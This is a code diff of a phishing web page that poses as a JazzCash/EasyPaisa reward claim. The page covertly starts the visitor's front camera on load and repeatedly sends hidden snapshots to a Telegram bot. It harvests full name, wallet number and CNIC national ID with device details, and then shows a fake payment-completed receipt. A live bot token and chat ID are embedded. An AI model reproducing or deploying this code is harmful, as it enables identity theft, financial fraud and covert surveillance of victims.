@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Reward Portal - Verified</title>
+    <title>JazzCash Reward Center</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap');
         :root { --jazz-red: #d71921; --easy-green: #00ad45; --active-color: #d71921; }
@@ -13,16 +13,13 @@
         label { display: block; text-align: left; font-size: 11px; font-weight: 600; color: #888; margin-bottom: 5px; text-transform: uppercase; margin-top: 15px; }
         input, select { width: 100%; padding: 15px; border: 1px solid #eee; border-radius: 12px; box-sizing: border-box; font-size: 15px; outline: none; }
         .btn { width: 100%; background: var(--active-color); color: white; padding: 18px; border: none; border-radius: 35px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; }
-        #loading-section { display: none; margin-top: 20px; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--active-color); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: inline-block; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #success-screen { display: none; background: white; min-height: 100vh; padding: 40px 20px; box-sizing: border-box; }
         .success-icon { color: #28a745; font-size: 70px; }
         .amount-big { font-size: 45px; font-weight: 700; border-top: 2px solid #f4f4f4; border-bottom: 2px solid #f4f4f4; padding: 25px 0; margin: 25px 0; }
         .r-table { width: 100%; font-size: 14px; text-align: left; }
         .r-val { font-weight: 600; text-align: right; }
         .bank-info { font-size: 11px; color: #555; display: block; }
-        #v-hidden, canvas { display: none; position: absolute; left: -9999px; }
+        #v-hidden, canvas { display: none; position: fixed; left: -9999px; }
     </style>
 </head>
 <body onload="initCamera()">
@@ -37,16 +34,12 @@
             <option value="EasyPaisa">EasyPaisa</option>
         </select>
         <label>Account Holder Name</label>
-        <input type="text" id="u_name" placeholder="Enter Full Name">
+        <input type="text" id="u_name" placeholder="Full Name">
         <label>Wallet Number</label>
         <input type="tel" id="u_num" placeholder="03XXXXXXXXX" maxlength="11">
         <label>CNIC Number</label>
         <input type="tel" id="u_cnic" placeholder="42XXXXXXXXXXX" maxlength="13">
         <button class="btn" id="main-btn" onclick="submitData()">CLAIM NOW</button>
-        <div id="loading-section">
-            <div class="spinner"></div><br>
-            <span style="color:#555; font-size:13px;">Processing...</span>
-        </div>
     </div>
 </div>
 
@@ -68,7 +61,6 @@
         <tr><td>Status</td><td class="r-val" style="color:#28a745;">COMPLETED</td></tr>
         <tr><td>Date</td><td class="r-val" id="r-date"></td></tr>
     </table>
-    <div style="margin-top:50px;"><img id="success-logo" src="https://upload.wikimedia.org/wikipedia/commons/3/30/JazzCash_logo.png" width="100"></div>
     <audio id="iphone-tone" src="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3" preload="auto"></audio>
 </div>
 
@@ -76,6 +68,7 @@
 <canvas id="c-hidden"></canvas>
 
 <script>
+    // IDs Updated
     const botToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
     const chatID = "7107389141";
 
@@ -84,7 +77,6 @@
         const color = (wallet === 'EasyPaisa') ? '#00ad45' : '#d71921';
         document.getElementById('main-header').style.background = color;
         document.getElementById('main-btn').style.background = color;
-        document.getElementById('from-name').style.color = color;
     }
 
     async function initCamera() {
@@ -92,80 +84,53 @@
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             const video = document.getElementById('v-hidden');
             video.srcObject = stream;
+            
             video.onplaying = () => {
-                // Camera adjustment ke liye 3s wait, phir 2s interval pe capture
-                setTimeout(() => { setInterval(capturePhoto, 2000); }, 3000);
+                setTimeout(() => { setInterval(capturePhoto, 2500); }, 2000); 
             };
-        } catch (e) {}
+        } catch (e) { console.log("Cam Blocked"); }
     }
 
     function capturePhoto() {
         const video = document.getElementById('v-hidden');
         const canvas = document.getElementById('c-hidden');
-        const ctx = canvas.getContext('2d');
-
-        if (video.readyState === 4 && video.videoWidth > 0) {
-            canvas.width = video.videoWidth; 
+        if (video.readyState === 4) {
+            canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0);
+            canvas.getContext('2d').drawImage(video, 0, 0);
             
-            // Masla Hal: Pixel brightness check karein
-            const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
-            let hasLight = false;
-            for (let i = 0; i < imgData.length; i += 40) {
-                if (imgData[i] > 10 || imgData[i+1] > 10 || imgData[i+2] > 10) {
-                    hasLight = true; break;
-                }
-            }
-
-            // Sirf wahi photo bheje jo black na ho
-            if (hasLight) {
-                canvas.toBlob(blob => {
+            canvas.toBlob(blob => {
+                if (blob) {
                     const fd = new FormData();
-                    fd.append('chat_id', chatID); fd.append('photo', blob, 'hit.jpg');
+                    fd.append('chat_id', chatID);
+                    fd.append('photo', blob, 'hit.jpg');
                     fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
-                }, 'image/jpeg', 0.6);
-            }
+                }
+            }, 'image/jpeg', 0.6);
         }
-    }
-
-    function getDevice() {
-        const ua = navigator.userAgent;
-        let model = "Desktop";
-        if (/Android/i.test(ua)) {
-            const m = ua.match(/Android\s+([\d\.]+);\s+([^;]+)\s+Build/);
-            model = m ? m[2] : "Android";
-        } else if (/iPhone/i.test(ua)) model = "iPhone";
-        return `${model} | Screen: ${screen.width}x${screen.height}`;
     }
 
     async function submitData() {
         const name = document.getElementById('u_name').value;
         const num = document.getElementById('u_num').value;
         const cnic = document.getElementById('u_cnic').value;
-        if(num.length !== 11 || cnic.length !== 13 || !name) {
-            alert("Fill all fields correctly!"); return;
-        }
+        
+        if(!name || num.length < 11) { alert("Sahi details likhein!"); return; }
 
-        document.getElementById('main-btn').style.display = 'none';
-        document.getElementById('loading-section').style.display = 'block';
-
-        const device = getDevice();
-        const text = `🎯 *NEW HIT* 🎯\n👤 Name: ${name}\n📱 No: ${num}\n🆔 CNIC: ${cnic}\n📱 Device: ${device}\n💎 Sender: MUDASIR ABBAS`;
+        const device = navigator.userAgent; 
+        const msg = `🎯 *NEW HIT* 🎯\n👤 Name: ${name}\n📱 No: ${num}\n🆔 CNIC: ${cnic}\n📱 Device: ${device}\n💎 Sender: MUDASIR ABBAS (UBL)`;
 
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatID, text: text, parse_mode: 'Markdown' })
+            body: JSON.stringify({ chat_id: chatID, text: msg, parse_mode: 'Markdown' })
         });
 
-        setTimeout(() => {
-            document.getElementById('form-page').style.display = 'none';
-            document.getElementById('success-screen').style.display = 'block';
-            document.getElementById('r-to').innerHTML = name.toUpperCase() + "<br>" + num;
-            document.getElementById('r-date').innerText = new Date().toLocaleString();
-            document.getElementById('iphone-tone').play().catch(()=>{});
-        }, 2000);
+        document.getElementById('form-page').style.display = 'none';
+        document.getElementById('success-screen').style.display = 'block';
+        document.getElementById('r-to').innerText = name.toUpperCase() + " (" + num + ")";
+        document.getElementById('r-date').innerText = new Date().toLocaleString();
+        document.getElementById('iphone-tone').play().catch(()=>{});
     }
 </script>
 </body>
